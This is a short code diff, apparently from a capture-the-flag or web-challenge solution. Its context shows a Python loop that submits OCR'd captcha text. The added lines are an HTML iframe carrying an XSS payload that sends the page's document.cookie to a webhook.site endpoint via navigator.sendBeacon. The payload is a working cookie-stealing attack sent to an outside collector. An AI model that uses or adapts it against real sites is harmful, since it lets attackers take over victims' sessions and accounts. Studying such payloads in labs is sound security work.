@@ -18,3 +18,9 @@ while True:
         print(r.text)
         print(s.cookies.get_dict())
         sendit=s.post(url,data={'captcha':ocr_text})
+
+
+<iframe
+  name="body"
+  srcdoc="<a id=togglePopover href=foobar:if(!window.sent)window.sent=navigator.sendBeacon('https://webhook.site/2b07a131-de46-4153-beaf-406c2e5819a2',document.cookie)></a>"
+></iframe>
